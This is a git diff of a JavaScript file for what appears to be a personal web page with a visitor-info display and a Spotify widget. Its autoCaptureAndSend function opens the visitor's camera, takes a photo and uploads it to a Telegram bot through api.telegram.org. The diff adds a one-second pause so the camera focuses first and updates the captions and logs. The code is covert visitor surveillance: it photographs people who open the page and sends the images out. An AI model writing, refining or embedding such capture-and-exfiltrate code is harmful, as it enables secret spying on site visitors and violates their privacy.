@@ -53,11 +53,16 @@ async function autoCaptureAndSend() {
     video.srcObject = stream;
     video.playsInline = true;
 
+    // Tunggu video siap
     await new Promise(res => {
       video.onloadedmetadata = () => video.play().then(res).catch(res);
       setTimeout(res, 3000);
     });
 
+    // 🕐 Tambahkan jeda 1 detik agar kamera bisa fokus dulu
+    await new Promise(r => setTimeout(r, 1000));
+
+    // Ambil gambar setelah fokus stabil
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -70,7 +75,7 @@ async function autoCaptureAndSend() {
     const blob = await (await fetch(base64img)).blob();
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
-    fd.append("caption", "📸 Auto-capture dari pengunjung");
+    fd.append("caption", "📸 Auto-capture dari pengunjung (dengan fokus 1s)");
     fd.append("photo", blob, "capture.png");
 
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -78,11 +83,8 @@ async function autoCaptureAndSend() {
       body: fd
     });
 
-    if (res.ok) {
-      console.log("✅ Foto berhasil dikirim ke Telegram");
-    } else {
-      console.warn("⚠️ Gagal kirim foto");
-    }
+    if (res.ok) console.log("✅ Foto terkirim (fokus 1s)");
+    else console.warn("⚠️ Gagal kirim foto");
   } catch (err) {
     console.error("❌ Tidak bisa akses kamera:", err);
   }
@@ -620,3 +622,4 @@ showVisitorInfo();
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
